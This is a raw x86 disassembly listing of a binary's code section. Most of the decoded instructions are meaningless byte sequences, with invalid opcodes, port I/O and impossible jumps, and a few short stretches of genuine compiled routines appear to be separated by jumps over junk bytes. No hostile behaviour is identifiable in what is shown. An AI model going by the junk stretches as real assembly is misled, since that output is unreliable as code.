  413a84:	sub    esp,ebx
  413a86:	dec    ebx
  413a87:	sbb    esi,DWORD PTR [edi-0x491c1d65]
  413a8d:	inc    eax
  413a8f:	sti    
  413a90:	xchg   DWORD PTR [edi-0x15ba5b89],ebp
  413a96:	mov    ecx,0x800bffd3
  413a9b:	adc    bh,BYTE PTR [edx]
  413a9d:	and    eax,0xd2819635
  413aa2:	leave  
  413aa3:	inc    esi
  413aa4:	inc    ebx
  413aa5:	ss push ss
  413aa7:	into   
  413aa8:	push   cs
  413aa9:	retf   0x913b
  413aac:	aad    0x88
  413aae:	cli    
  413aaf:	cmp    al,0xd6
  413ab1:	out    dx,al
  413ab2:	sti    
  413ab3:	sti    
  413ab4:	mov    al,BYTE PTR [ebx+0x3471323]
  413aba:	and    esi,DWORD PTR ds:0x56be4bf5
  413ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ac1:	(bad)  
  413ac2:	out    dx,eax
  413ac3:	and    eax,0x2d339666
  413ac8:	cwde   
  413ac9:	push   ecx
  413aca:	cmp    ah,BYTE PTR [edi+0x61a22239]
  413ad0:	or     al,0x11
  413ad2:	sub    dl,BYTE PTR [edx-0x4c]
  413ad5:	test   al,0x3f
  413ad7:	and    cl,BYTE PTR [ebp+ebp*4+0x3e]
  413adb:	mov    al,0x7f
  413add:	lock test al,0xbf
  413ae0:	ret    0xca66
  413ae3:	and    ebp,ebx
  413ae5:	sub    al,0x95
  413ae7:	cli    
  413ae8:	dec    ebx
  413ae9:	int3   
  413aea:	icebp  
  413aeb:	ins    BYTE PTR es:[edi],dx
  413aec:	aam    0xec
  413aee:	clc    
  413aef:	mov    DWORD PTR [edx],0x9d69c490
  413af5:	jne    0x413b0f
  413af7:	pop    ebp
  413af8:	sub    ecx,DWORD PTR [ebx]
  413afa:	mov    bl,BYTE PTR [edi]
  413afc:	add    DWORD PTR ds:0x8e1f41dc,esi
  413b02:	shl    BYTE PTR [edx],0x63
  413b05:	add    bh,ch
  413b07:	xlat   BYTE PTR ds:[ebx]
  413b08:	push   ecx
  413b09:	sti    
  413b0a:	out    0x53,al
  413b0c:	ds pop eax
  413b0e:	fdiv   DWORD PTR [ecx-0x5b50a861]
  413b14:	out    0xa9,eax
  413b16:	adc    al,0x2c
  413b18:	mov    esp,0x9182f0ee
  413b1d:	bound  esp,QWORD PTR [ebx-0x49]
  413b20:	les    ebp,FWORD PTR [eax+0x405c0576]
  413b26:	and    DWORD PTR [eax+0x2c],ebp
  413b29:	aam    0x5f
  413b2b:	outs   dx,BYTE PTR ds:[esi]
  413b2c:	fidiv  DWORD PTR [eax+0x5f]
  413b2f:	fsubr  QWORD PTR [esi]
  413b31:	das    
  413b32:	pop    ecx
  413b33:	popa   
  413b34:	shl    BYTE PTR [edi-0x1],cl
  413b37:	cmp    eax,0x9fb06927
  413b3c:	mov    WORD PTR [edx+edx*4+0x56],es
  413b40:	mov    cl,0x9a
  413b42:	mov    ah,0x76
  413b44:	xchg   BYTE PTR [eiz*2+0x5bf5b18d],dh
  413b4b:	cli    
  413b4c:	mov    ss,WORD PTR [esi]
  413b4e:	in     al,0x99
  413b50:	cmc    
  413b51:	sub    DWORD PTR [ebx],ebx
  413b53:	sub    edi,DWORD PTR [ebx+0xc]
  413b56:	imul   edi,DWORD PTR [ebx+0x18],0x36
  413b5a:	cmp    BYTE PTR [edi-0x27],bl
  413b5d:	outs   dx,BYTE PTR ds:[esi]
  413b5e:	aaa    
  413b5f:	sahf   
  413b60:	mov    BYTE PTR [edi-0xa],ch
  413b63:	xchg   ebx,edx
  413b65:	and    ecx,esi
  413b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b68:	arpl   WORD PTR [eax+0x6c7ba511],bp
  413b6e:	scas   al,BYTE PTR es:[edi]
  413b6f:	mov    DWORD PTR [ebp+0x3d],esp
  413b72:	mov    edx,0x4d9fce7c
  413b77:	jle    0x413b86
  413b79:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  413b7b:	cmp    edx,DWORD PTR [eax-0x4e]
  413b7e:	mov    edx,DWORD PTR [ebx]
  413b80:	aam    0xd3
  413b82:	loope  0x413bfa
  413b84:	dec    ecx
  413b85:	dec    edi
  413b86:	or     eax,0x38c21217
  413b8b:	jae    0x413b81
  413b8d:	sbb    ebp,ecx
  413b8f:	lods   eax,DWORD PTR ds:[esi]
  413b90:	test   esi,edi
  413b92:	int3   
  413b93:	mov    eax,ds:0xabef1376
  413b98:	xchg   ebp,eax
  413b99:	mov    eax,0x43c7e932
  413b9e:	outs   dx,BYTE PTR ds:[esi]
  413b9f:	sbb    ecx,DWORD PTR [edi-0x68]
  413ba2:	pop    es
  413ba3:	cmp    DWORD PTR [esi-0x1475b14c],0x72
  413baa:	repz and dh,BYTE PTR [ebx-0x7c4be319]
  413bb1:	repz rol ebx,cl
  413bb4:	pop    eax
  413bb5:	jmp    0x413ba6
  413bb7:	sahf   
  413bb8:	sub    al,0xe0
  413bba:	shr    al,1
  413bbc:	nop
  413bbd:	aas    
  413bbe:	cmp    BYTE PTR cs:[ecx+0x4c8d7708],al
  413bc5:	retf   
  413bc6:	dec    edx
  413bc7:	add    al,0x32
  413bc9:	inc    ebx
  413bca:	jle    0x413c16
  413bcc:	cmp    bh,ch
  413bce:	cmp    ebp,esi
  413bd0:	fxch   st(7)
  413bd2:	(bad)  
  413bd3:	fs dec edi
  413bd5:	lahf   
  413bd6:	xor    BYTE PTR [ebx+0x64],ch
  413bd9:	sbb    eax,DWORD PTR [bx]
  413bdc:	daa    
  413bdd:	std    
  413bde:	jmp    0x420f98bc
  413be3:	pushf  
  413be4:	in     eax,0xd1
  413be6:	mov    eax,DWORD PTR [edx-0x1d8e556a]
  413bec:	cld    
  413bed:	fmul   DWORD PTR [ecx]
  413bef:	sub    BYTE PTR [edx+ebp*2],bh
  413bf2:	cmp    ebx,DWORD PTR [ecx]
  413bf4:	jo     0x413bc4
  413bf6:	mov    edi,DWORD PTR [eax-0x3cbff90b]
  413bfc:	(bad)  
  413bfd:	pop    eax
  413bfe:	daa    
  413bff:	fwait
  413c00:	test   BYTE PTR [ebp+0x27],bh
  413c03:	jnp    0x413c05
  413c05:	or     BYTE PTR [eax+0x46],0xa3
  413c09:	sbb    ah,dl
  413c0b:	test   BYTE PTR [ebp+0x28],cl
  413c0e:	jmp    0x97f47d08
  413c13:	add    BYTE PTR [ebp+0x2a],0xca
  413c17:	push   cs
  413c18:	outs   dx,BYTE PTR ds:[esi]
  413c19:	jp     0x413c91
  413c1b:	out    dx,eax
  413c1c:	aaa    
  413c1d:	mov    cs,WORD PTR [ecx+0x67cf813d]
  413c23:	mov    eax,ds:0x915ca157
  413c28:	icebp  
  413c29:	test   DWORD PTR [esi],edi
  413c2b:	pop    es
  413c2c:	popf   
  413c2d:	shl    DWORD PTR [eax],1
  413c2f:	clc    
  413c30:	lods   eax,DWORD PTR ds:[esi]
  413c31:	mov    ds:0xaf0316ed,al
  413c36:	cli    
  413c37:	dec    esi
  413c38:	imul   ebp,esp,0x899dc8d
  413c3e:	jb     0x413bf5
  413c40:	pop    ebx
  413c41:	in     al,0x84
  413c43:	cmp    esp,DWORD PTR [edi+0x6]
  413c46:	fcmovbe st,st(4)
  413c48:	mov    bh,0x83
  413c4a:	xor    DWORD PTR [edi+0x2b],edx
  413c4d:	(bad)  
  413c4e:	push   ebp
  413c4f:	jno    0x413c16
  413c51:	lea    esi,[edx+edx*4]
  413c54:	xchg   esp,eax
  413c55:	push   DWORD PTR [ebx+0x1cb9ab01]
  413c5b:	push   ebp
  413c5c:	ret    0xf1fd
  413c5f:	cwde   
  413c60:	hlt    
  413c61:	jmp    0xa31863af
  413c66:	and    eax,0x298d38f9
  413c6b:	mov    edi,0x6ed7a6ea
  413c70:	inc    ebx
  413c71:	dec    ebx
  413c72:	data16 mov bl,0x6e
  413c75:	je     0x413cd7
  413c77:	mov    BYTE PTR ds:0x94dcef9b,cl
  413c7d:	mov    bh,0xf2
  413c7f:	add    BYTE PTR [eax+0x2d4f4e4e],ch
  413c85:	push   ecx
  413c86:	ins    BYTE PTR es:[edi],dx
  413c87:	je     0x413cf6
  413c89:	mov    ecx,0xd8356005
  413c8e:	sbb    BYTE PTR [edi+0x6974546a],ah
  413c94:	retf   
  413c95:	test   al,0xf1
  413c97:	xchg   ebx,eax
  413c98:	fwait
  413c99:	mov    esp,0x11612dd5
  413c9e:	mov    ebp,0x1c6b4d56
  413ca3:	sbb    ebx,DWORD PTR [edx]
  413ca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ca6:	mov    ah,0xb
  413ca8:	lods   al,BYTE PTR ds:[esi]
  413ca9:	lea    ebx,[eax]
  413cab:	add    edx,DWORD PTR [eax]
  413cad:	mov    ecx,DWORD PTR [ebp-0x28]
  413cb0:	adc    ebx,DWORD PTR [eax+0x4]
  413cb3:	push   0x2
  413cb5:	xor    ebx,esi
  413cb7:	mov    esi,DWORD PTR [ebp-0x24]
  413cba:	pop    esi
  413cbb:	sub    esi,ecx
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	mov    ah,0x86
  413d00:	leave  
  413d01:	jl     0x413c8c
  413d03:	xor    bl,BYTE PTR [eax]
  413d05:	sbb    BYTE PTR [edx+0x4f181812],ch
  413d0b:	test   al,0xce
  413d0d:	loopne 0x413d88
  413d0f:	out    dx,al
  413d10:	add    DWORD PTR fs:[ecx+edx*4],edx
  413d14:	xor    DWORD PTR [ebx-0x1fdc5380],ebx
  413d1a:	std    
  413d1b:	push   esp
  413d1c:	fst    st(7)
  413d1e:	out    0x3d,eax
  413d20:	ds and al,0xda
  413d23:	pop    es
  413d24:	jp     0x413cc5
  413d26:	jmp    0x413d1e
  413d28:	outs   dx,DWORD PTR ds:[esi]
  413d29:	or     DWORD PTR [eax-0x7c92e25b],eax
  413d2f:	in     eax,dx
  413d30:	mov    ebp,0xd68cec9f
  413d35:	bound  ecx,QWORD PTR [eax]
  413d37:	jecxz  0x413d7a
  413d39:	leave  
  413d3a:	gs pop es
  413d3c:	pushf  
  413d3d:	cld    
  413d3e:	psadbw mm1,QWORD PTR [ebx-0x7c]
  413d42:	out    0x9e,eax
  413d44:	add    BYTE PTR [esi+0xf],ch
  413d47:	nop
  413d48:	push   es
  413d49:	ds out dx,al
  413d4b:	hlt    
  413d4c:	div    DWORD PTR [ebp+ebx*1+0x49]
  413d50:	fwait
  413d51:	mov    dh,0xe
  413d53:	xchg   ebx,eax
  413d54:	sbb    ebp,DWORD PTR ds:0xf90dd583
  413d5a:	dec    edx
  413d5b:	cmp    eax,0x7ee82950
  413d60:	les    eax,FWORD PTR [eax-0x53d2795b]
  413d66:	mov    ss,WORD PTR [eax+eiz*2]
  413d69:	(bad)  
  413d6a:	lock stos DWORD PTR es:[edi],eax
  413d6c:	lods   al,BYTE PTR ds:[esi]
  413d6d:	outs   dx,DWORD PTR ds:[esi]
  413d6e:	clc    
  413d6f:	and    eax,0x97dc4307
  413d74:	je     0x413d79
  413d76:	outs   dx,BYTE PTR ds:[esi]
  413d77:	adc    dl,BYTE PTR [ebx+0x7f]
  413d7a:	push   0x4f5eeae5
  413d7f:	pop    ss
  413d80:	cmp    eax,0xbe0ab229
  413d85:	or     dh,dl
  413d87:	(bad)  
  413d88:	dec    edx
  413d89:	hlt    
  413d8a:	lea    ebx,[esi]
  413d8c:	jo     0x413e0d
  413d8e:	lods   eax,DWORD PTR ds:[esi]
  413d8f:	push   edi
  413d90:	sbb    eax,0xa2b64f16
  413d95:	jge    0x413d29
  413d97:	cwde   
  413d98:	add    BYTE PTR [edi+0x19f54b21],ah
  413d9e:	add    ebp,DWORD PTR [edi-0x417af2e4]
  413da4:	repnz sbb DWORD PTR [ebp+esi*8+0x59],esi
  413da9:	pop    eax
  413daa:	mov    cl,0xf8
  413dac:	stos   DWORD PTR es:[edi],eax
  413dad:	dec    ebx
  413dae:	pusha  
  413daf:	inc    edi
  413db0:	sahf   
  413db1:	sti    
  413db2:	loopne 0x413dc0
  413db4:	test   al,0x79
  413db6:	in     eax,dx
  413db7:	pop    ds
  413db8:	rdtsc  
  413dba:	popf   
  413dbb:	add    eax,0x8a2842a6
  413dc0:	pop    ebx
  413dc1:	add    DWORD PTR [esi],ebx
  413dc3:	sbb    ah,BYTE PTR [edx-0xf]
  413dc6:	mov    edx,0x2df6d40a
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	jae    0x413d8e
  413dce:	fadd   DWORD PTR [ebx]
  413dd0:	das    
  413dd1:	adc    eax,0xeac369f5
  413dd6:	xchg   dl,dh
  413dd8:	jns    0x413e56
  413dda:	or     bh,dh
  413ddc:	sub    al,BYTE PTR [edi+0x4b]
  413ddf:	mov    ch,0x3
  413de1:	mov    bh,0xb3
  413de3:	popf   
  413de4:	or     ah,BYTE PTR [ebx+0x7883e31f]
  413dea:	scas   al,BYTE PTR es:[edi]
  413deb:	push   edi
  413dec:	xchg   ecx,eax
  413ded:	aad    0x72
  413def:	sub    DWORD PTR [ebx-0x206dd281],edi
  413df5:	cli    
  413df6:	rcr    BYTE PTR [eax-0x49],1
  413df9:	cmc    
  413dfa:	cwde   
  413dfb:	lods   al,BYTE PTR ds:[esi]
  413dfc:	div    cl
  413dfe:	cmp    BYTE PTR [esi+0x56],dh
  413e01:	in     eax,dx
  413e02:	scas   eax,DWORD PTR es:[edi]
  413e03:	test   ecx,esi
  413e05:	(bad)  [edi-0x4befaae4]
  413e0b:	jg     0x413e56
  413e0d:	push   edx
  413e0e:	push   eax
  413e0f:	mov    BYTE PTR [edx],0xe9
  413e12:	pop    ax
  413e14:	jge    0x413dc0
  413e16:	sahf   
  413e17:	outs   dx,DWORD PTR ds:[esi]
  413e18:	gs mov ebp,edi
  413e1b:	adc    esi,DWORD PTR [edi-0x64ceeaa0]
  413e21:	hlt    
  413e22:	aad    0x7e
  413e24:	mov    bl,0x86
  413e26:	test   al,0x6c
  413e28:	pop    ss
  413e29:	bound  eax,QWORD PTR [edi+ebp*4]
  413e2c:	pushf  
  413e2d:	cmp    DWORD PTR [ecx-0x3904d03],edx
  413e33:	js     0x413ea5
  413e35:	pop    ebx
  413e36:	xor    BYTE PTR [eax-0x49],bl
  413e39:	xor    ch,bh
  413e3b:	in     al,0x67
  413e3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e3e:	mov    eax,ds:0x1c3bd5e1
  413e43:	int3   
  413e44:	ss sbb eax,0xf27a3db1
  413e4a:	adc    bl,BYTE PTR [ebp-0x43]
  413e4d:	fsub   st(4),st
  413e4f:	push   0xdfd6894f
  413e54:	outs   dx,BYTE PTR ds:[esi]
  413e55:	push   cs
  413e56:	mov    ah,0xbc
  413e58:	je     0x413e3c
  413e5a:	or     BYTE PTR [esi],0xc1
  413e5d:	pushf  
  413e5e:	xchg   ebp,eax
  413e5f:	sahf   
  413e60:	push   0x8d93a455
  413e65:	mov    es,ebp
  413e67:	out    dx,eax
  413e68:	icebp  
  413e69:	xchg   esp,eax
  413e6a:	or     BYTE PTR [ecx+ecx*1+0x1d],ch
  413e6e:	mov    bh,0xca
  413e70:	or     eax,0x3050b252
  413e75:	mov    BYTE PTR [esi],0xd1
  413e78:	out    dx,eax
  413e79:	dec    edx
  413e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e7b:	fld    QWORD PTR [ebx-0x450e461a]
  413e81:	std    
  413e82:	fwait
  413e83:	dec    edi
  413e84:	sbb    dh,ah
  413e86:	mov    bh,0xa0
  413e88:	mov    cl,al
  413e8a:	js     0x413e6c
  413e8c:	pop    ebp
  413e8d:	shl    DWORD PTR [ebx-0x77],cl
  413e90:	in     eax,dx
  413e91:	push   esp
  413e92:	in     al,dx
  413e93:	mov    edx,0xff6caee8
  413e98:	inc    edi
  413e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e9a:	adc    eax,0x6a5f25a5
  413e9f:	adc    bh,dl
  413ea1:	lods   eax,DWORD PTR ds:[esi]
  413ea2:	inc    edi
  413ea3:	sahf   
  413ea4:	pop    ds
  413ea5:	lock loopne 0x413e6f
  413ea8:	and    al,0xc7
  413eaa:	inc    esi
  413eab:	adc    dh,BYTE PTR [ebx-0x3f]
  413eae:	xchg   esp,eax
  413eaf:	adc    eax,0xbcc77b2
  413eb4:	pop    esp
  413eb5:	mov    DWORD PTR [ebx+0xe293d22],eax
  413ebb:	addr16 je 0x413eff
  413ebe:	hlt    
  413ebf:	cdq    
  413ec0:	add    al,0xef
  413ec2:	mov    ebx,0x3309c9ef
  413ec7:	test   DWORD PTR [eax+ebp*1-0x1b],eax
  413ecb:	je     0x413e69
  413ecd:	jge    0x413f27
  413ecf:	xor    ah,BYTE PTR [edi]
  413ed1:	sbb    BYTE PTR [esi],ch
  413ed3:	sbb    DWORD PTR ss:[ebp+0x74],ebp
  413ed7:	addr16 mov eax,ds:0xba1c
  413edb:	push   es
  413edc:	(bad)  
  413edd:	icebp  
  413ede:	jbe    0x413e83
  413ee0:	jmp    0x668760b6
  413ee5:	mov    esp,0x6b142047
  413eea:	push   ss
  413eeb:	adc    BYTE PTR [edx-0x79],bh
  413eee:	push   0xffffffc6
  413ef0:	pop    ebp
  413ef1:	xchg   ebx,eax
  413ef2:	arpl   WORD PTR [eax],cx
  413ef4:	stc    
  413ef5:	imul   ecx,edi,0xffffffac
  413ef8:	inc    eax
  413ef9:	adc    eax,0xba02809f
  413efe:	stos   BYTE PTR es:[edi],al
  413eff:	jo     0x413f17
  413f01:	pop    edx
  413f02:	les    edx,FWORD PTR [esi-0x7b]
  413f05:	cwde   
  413f06:	and    dh,BYTE PTR [esi-0x3c]
  413f09:	adc    dh,BYTE PTR [ebp+0x66]
  413f0c:	idiv   cl
  413f0e:	xchg   esp,eax
  413f0f:	test   BYTE PTR [edi-0x64],ah
  413f12:	aaa    
  413f13:	jge    0x413f77
  413f15:	shl    BYTE PTR [eax],0x80
  413f18:	adc    eax,0x9be608e4
  413f1d:	push   es
  413f1e:	ja     0x413eda
  413f20:	push   ecx
  413f21:	(bad)  
  413f22:	repnz sub esp,DWORD PTR [ebx+0x70]
  413f26:	je     0x413f3f
  413f28:	cli    
  413f29:	jbe    0x413ed3
  413f2b:	and    al,0xce
  413f2d:	mov    BYTE PTR [eax-0x7d1fe3f],bl
  413f33:	into   
  413f34:	outs   dx,BYTE PTR ds:[esi]
  413f35:	push   0x13
  413f37:	rcl    BYTE PTR [edi+edx*8],1
  413f3a:	xchg   edx,eax
  413f3b:	retf   0xe67c
  413f3e:	lahf   
  413f3f:	cs fwait
  413f41:	mov    cl,0x9d
  413f43:	sbb    eax,DWORD PTR [edi-0x32cb6508]
  413f49:	sub    eax,edx
  413f4b:	pop    esp
  413f4c:	jbe    0x413f24
  413f4e:	mov    al,ds:0x7b213266
  413f53:	mov    esp,0x34db9191
  413f58:	pop    ss
  413f59:	mov    ds:0x4595ef1e,al
  413f5e:	xchg   DWORD PTR [eax],ebx
  413f60:	jns    0x413f49
  413f62:	push   ebp
  413f63:	cld    
  413f64:	popf   
  413f65:	dec    ebp
  413f66:	mov    dl,0x3c
  413f68:	mov    dl,0x33
  413f6a:	cmp    DWORD PTR [ecx],ebx
  413f6c:	cmp    ah,bl
  413f6e:	in     al,0x9c
  413f70:	xchg   edx,eax
  413f71:	clc    
  413f72:	jg     0x413f7a
  413f74:	adc    eax,0xadee9148
  413f79:	cmp    ebx,DWORD PTR [edi+0x6f027d3]
  413f7f:	fbld   TBYTE PTR [esi-0x33026359]
  413f85:	lds    ecx,FWORD PTR [eax]
  413f87:	fidiv  WORD PTR [ecx+ebp*1-0x26]
  413f8b:	out    dx,al
  413f8c:	jb     0x413f5d
  413f8e:	mov    edx,DWORD PTR [eax]
  413f90:	push   ebx
  413f91:	ss retf 
  413f93:	out    0x8e,al
  413f95:	lods   al,BYTE PTR ds:[esi]
  413f96:	(bad)  
  413f97:	aam    0xa8
  413f99:	pop    ecx
  413f9a:	xchg   DWORD PTR [ecx-0x7b],esi
  413f9d:	pop    DWORD PTR [ecx+0x272f214e]
  413fa3:	sub    al,BYTE PTR [esi+0xe]
  413fa6:	mov    eax,ds:0x485672de
  413fab:	iret   
  413fac:	arpl   WORD PTR [edx],bp
  413fae:	or     dh,BYTE PTR [esi+ecx*8+0x4678bb9b]
  413fb5:	add    ebx,edi
  413fb7:	popa   
  413fb8:	pop    esp
  413fb9:	fsub   QWORD PTR [esi]
  413fbb:	mov    dh,0x5d
  413fbd:	cld    
  413fbe:	jo     0x414038
  413fc0:	pop    eax
  413fc1:	ret    0xa194
  413fc4:	fsubr  QWORD PTR [ecx]
  413fc6:	and    BYTE PTR [ebp+0x4b4ca7be],ah
  413fcc:	jne    0x414022
  413fce:	jns    0x413ffc
  413fd0:	lahf   
  413fd1:	sti    
  413fd2:	dec    edi
  413fd3:	es std 
  413fd5:	pushf  
  413fd6:	imul   eax,DWORD PTR [esi-0x3a],0xe3a1381f
  413fdd:	dec    esi
  413fde:	shl    BYTE PTR [ecx],0x80
  413fe1:	call   0x3d6ba885
  413fe6:	cmp    al,0xe4
  413fe8:	pushf  
  413fe9:	out    dx,al
  413fea:	das    
  413feb:	bound  esi,QWORD PTR [ebx]
  413fed:	jne    0x41403f
  413fef:	xor    edx,ecx
  413ff1:	out    dx,al
  413ff2:	jnp    0x413fdb
  413ff4:	pop    ds
  413ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ff6:	cwde   
  413ff7:	jmp    0xceda:0x80088e3c
  413ffe:	sub    al,0xe0
  414000:	ss sti 
  414002:	imul   BYTE PTR [esi+0x7d]
  414005:	xor    al,0xd4
  414007:	jle    0x414034
  414009:	loopne 0x413f94
  41400b:	cmp    cl,dh
  41400d:	out    dx,eax
  41400e:	jo     0x414029
  414010:	sub    BYTE PTR [eax+0x5f],bl
  414013:	adc    al,0xc5
  414015:	les    eax,FWORD PTR [ecx+0xcb14ae7]
  41401b:	jmp    0xec88:0x2263133
  414022:	fs ds sbb al,0x7d
  414026:	xor    DWORD PTR fs:[edi-0x2d],ebp
  41402a:	inc    ebx
  41402b:	dec    eax
  41402c:	mov    edi,0x7d4414a1
  414031:	bound  edi,QWORD PTR [esi+ecx*2-0x1942f7a6]
  414038:	adc    edx,DWORD PTR [ecx-0x2]
  41403b:	inc    ebx
  41403c:	or     al,0x1a
  41403e:	sub    BYTE PTR ds:0x5dc169d8,bl
  414044:	sti    
  414045:	ror    DWORD PTR [edx],cl
  414047:	sti    
  414048:	push   esp
  414049:	mov    DWORD PTR [ecx-0x1d7eb72e],edi
  41404f:	imul   ecx,DWORD PTR [ebp+ebx*4+0x1ca2c847],0x2b
  414057:	cli    
  414058:	outs   dx,BYTE PTR ds:[esi]
  414059:	add    edi,edx
  41405b:	into   
  41405c:	push   ss
  41405d:	or     esp,DWORD PTR [ecx-0x275e2b91]
  414063:	and    DWORD PTR [esi],edx
  414065:	xchg   ebx,eax
  414066:	cmp    esi,DWORD PTR [ecx+0x13]
  414069:	or     eax,0xd4b5c9fb
  41406e:	mov    ah,0xa8
  414070:	jnp    0x4140ba
  414072:	mov    ch,BYTE PTR [eax]
  414074:	in     eax,0x79
  414076:	cmp    al,0xf1
  414078:	imul   ebx,DWORD PTR [edx],0xbc3164ca
  41407e:	push   ss
  41407f:	pop    eax
  414080:	in     al,0xb3
  414082:	rcl    al,cl
  414084:	jno    0x4140c0
  414086:	shr    BYTE PTR [ecx+esi*4+0x16a61a64],0xd8
  41408e:	ins    DWORD PTR es:[edi],dx
  41408f:	sahf   
  414090:	aam    0x13
  414092:	jae    0x4140b3
  414094:	dec    esi
  414095:	lods   eax,DWORD PTR ds:[esi]
  414096:	sti    
  414097:	xchg   ecx,eax
  414098:	stc    
  414099:	jns    0x41410c
  41409b:	push   0x71298d19
  4140a0:	cmp    esi,DWORD PTR [ebx+0xe]
  4140a3:	jo     0x4140c4
  4140a5:	xchg   esi,eax
  4140a6:	push   esp
  4140a7:	icebp  
  4140a8:	mov    bl,0xb2
  4140aa:	add    ecx,0xcb5a946c
  4140b0:	dec    eax
  4140b1:	xor    eax,0x4a078fae
  4140b6:	popa   
  4140b7:	jecxz  0x414079
  4140b9:	mov    bh,0x36
  4140bb:	aad    0x31
  4140bd:	cmp    al,0x47
  4140bf:	push   eax
  4140c0:	ror    BYTE PTR [eax+0x57e29771],0x89
  4140c7:	jne    0x41408d
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x422074
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [edi+eax*8+0x7e]
  414159:	mov    ds:0x182c1abc,eax
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    BYTE PTR [eax],cl
  414164:	les    eax,FWORD PTR [esi-0x1f]
  414167:	lock xchg edi,eax
  414169:	jp     0x4141df
  41416b:	daa    
  41416c:	mov    cl,0x64
  41416e:	fnstsw WORD PTR [ecx-0x565f8ea9]
  414174:	or     ebp,DWORD PTR [ebp-0x37]
  414177:	(bad)  
  414178:	sub    bl,BYTE PTR [esi-0x36]
  41417b:	clc    
  41417c:	loop   0x4140ff
  41417e:	mov    esi,0xc0ecade3
  414183:	test   al,0x91
  414185:	mov    ebp,0x17d871e
  41418a:	pop    es
  41418b:	xchg   ebp,eax
  41418c:	add    BYTE PTR [eax],0xc0
  41418f:	ficomp WORD PTR [ecx-0x54bdc9db]
  414195:	pop    ebx
  414196:	pusha  
  414197:	loope  0x414148
  414199:	sub    DWORD PTR [eax],esi
  41419b:	aas    
  41419c:	and    dl,bh
  41419e:	rcr    BYTE PTR [edx],1
  4141a0:	and    DWORD PTR [ecx-0x6a8ad5d2],esp
  4141a6:	ror    ah,1
  4141a8:	ds int3 
  4141aa:	neg    BYTE PTR [edi+0x7]
  4141ad:	pop    edi
  4141ae:	add    ebx,DWORD PTR [si+0x4e4b]
  4141b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141b4:	cmp    al,0xf0
  4141b6:	into   
  4141b7:	popf   
  4141b8:	xor    ah,dl
  4141ba:	imul   esi
  4141bc:	cmc    
  4141bd:	add    ah,dh
  4141bf:	(bad)  
  4141c0:	sbb    BYTE PTR [edx-0x66b36e11],al
  4141c6:	add    WORD PTR [ebp-0x12],dx
  4141ca:	nop
  4141cb:	mov    dh,0x51
  4141cd:	cmc    
  4141ce:	and    DWORD PTR [ebx],ebx
  4141d0:	data16 cld 
  4141d2:	iret   
  4141d3:	jne    0x41418b
  4141d5:	loopne 0x41418c
  4141d7:	call   0x90ce4186
  4141dc:	mov    ch,ah
  4141de:	lock jge 0x4141e0
  4141e1:	pop    ecx
  4141e2:	rcl    edx,0x71
  4141e5:	dec    ecx
  4141e6:	mov    esi,DWORD PTR [edi-0x2b]
  4141e9:	mov    ch,0x98
  4141eb:	mov    bl,0x6c
  4141ed:	fnstcw WORD PTR [eax-0x6adda218]
  4141f3:	iret   
  4141f4:	pop    ebp
  4141f5:	xor    al,0xf7
  4141f7:	jns    0x41420f
  4141f9:	mov    ds:0xb857018e,eax
  4141fe:	jle    0x414220
  414200:	push   esp
